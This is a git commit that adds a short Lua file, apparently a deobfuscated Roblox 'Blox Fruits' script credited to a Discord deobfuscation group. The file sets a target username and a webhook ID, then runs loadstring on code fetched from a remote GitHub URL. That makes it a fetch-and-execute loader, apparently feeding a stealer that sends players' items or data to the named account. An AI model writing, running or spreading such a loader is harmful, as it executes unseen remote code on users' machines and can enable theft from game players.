7403d88be114a92c0ffd207a160823fef04f5c34
avus <gabideziro@gmail.com>
2026-01-08 18:34:44 -0300

    Create MoonsecV3.lua

---
+++ MoonsecV3.lua
@@ -0,0 +1,9 @@
+-- deobfuscated by 25ms deobfuscator discord.gg/25ms
+
+
+Username = 'Caistwing'
+Webhook = '78845b65-5f28-4b8b-bebe-2ef274662e4a'
+
+loadstring(game:HttpGet([[https://raw.githubusercontent.com/MoonSecV3-dev/Bloxfruits/refs/heads/main/Darkscript]], true))()
+
+-- i will publish this script deobfuscated too dont worry
